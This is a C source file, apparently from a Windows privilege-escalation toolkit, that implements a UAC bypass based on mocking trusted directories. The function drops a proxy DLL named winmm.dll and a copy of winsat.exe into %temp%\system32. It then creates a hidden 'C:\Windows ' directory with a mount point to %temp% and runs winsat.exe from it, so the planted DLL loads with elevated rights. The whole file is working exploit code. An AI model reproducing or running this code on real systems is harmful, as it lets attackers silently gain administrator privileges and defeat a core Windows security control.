/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2018 - 2019
*
*  TITLE:       DWELLS.C
*
*  VERSION:     3.17
*
*  DATE:        18 Mar 2019
*
*  David Wells based method.
*
*  Original method URL:
*  https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmDirectoryMockMethod
*
* Purpose:
*
* UAC bypass abusing GetLongPathNameW behavior during AIS.
*
*/
NTSTATUS ucmDirectoryMockMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    NTSTATUS            MethodResult = STATUS_ACCESS_DENIED;
    HANDLE              hFakeWindows = NULL;
    UNICODE_STRING      usDirectoryName;
    OBJECT_ATTRIBUTES   ObjectAttributes;

    WCHAR szPayloadDir[MAX_PATH * 2];
    WCHAR szSource[MAX_PATH * 2];
    WCHAR szDest[MAX_PATH * 2];

    do {

        //
        // Create destination dir "system32" in %temp%
        //
        _strcpy(szPayloadDir, g_ctx->szTempDirectory);
        _strcat(szPayloadDir, L"system32\\");
        if (!CreateDirectory(szPayloadDir, NULL)) {
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;
        }

        //
        // Drop fubuki to %temp%\system32 as winmm.dll
        //
        _strcpy(szDest, szPayloadDir);
        _strcat(szDest, WINMM_DLL);
        if (!supWriteBufferToFile(szDest, ProxyDll, ProxyDllSize))
            break;

        //
        // Copy winsat to %temp%\system32
        //
        _strcpy(szSource, g_ctx->szSystemDirectory);
        _strcat(szSource, WINSAT_EXE);

        _strcpy(szDest, szPayloadDir);
        _strcat(szDest, WINSAT_EXE);
        if (!CopyFile(szSource, szDest, FALSE))
            break;

        //
        // Fake root.
        //
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        szSource[0] = L'\\';
        szSource[1] = L'?';
        szSource[2] = L'?';
        szSource[3] = L'\\';
        _strncpy(&szSource[4], 4, g_ctx->szSystemRoot, 4);
        _strcat(szSource, L"Windows ");

        RtlInitUnicodeString(&usDirectoryName, szSource);
        InitializeObjectAttributes(&ObjectAttributes, &usDirectoryName,
            OBJ_CASE_INSENSITIVE, NULL, NULL);

        if (!NT_SUCCESS(supCreateDirectory(
            &hFakeWindows,
            &ObjectAttributes,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN)))
        {
            break;
        }

        //
        // Set reparse to %temp%.
        //
        _strcpy(szSource, L"\\??\\");
        _strcat(szSource, g_ctx->szTempDirectory);
        supSetMountPoint(
            hFakeWindows,
            szSource,
            &szSource[4]);

        //
        // Run target application.
        //
        RtlSecureZeroMemory(&szSource, sizeof(szSource));
        _strncpy(szSource, 4, g_ctx->szSystemRoot, 4);
        _strcat(szSource, L"Windows \\system32\\");
        _strcat(szSource, WINSAT_EXE);
        if (supRunProcess(szSource, NULL))
            MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    //
    // Cleanup.
    //
    if (hFakeWindows) {
        //
        // Remove reparse point.
        //
        supDeleteMountPoint(hFakeWindows);
        NtClose(hFakeWindows);

        //
        // Remove directory.
        //
        RtlSecureZeroMemory(szSource, sizeof(szSource));
        szSource[0] = L'\\';
        szSource[1] = L'?';
        szSource[2] = L'?';
        szSource[3] = L'\\';
        _strncpy(&szSource[4], 4, g_ctx->szSystemRoot, 4);
        _strcat(szSource, L"Windows ");

        RtlInitUnicodeString(&usDirectoryName, szSource);
        InitializeObjectAttributes(&ObjectAttributes, &usDirectoryName,
            OBJ_CASE_INSENSITIVE, NULL, NULL);

        NtDeleteFile(&ObjectAttributes);
    }
    return MethodResult;
}
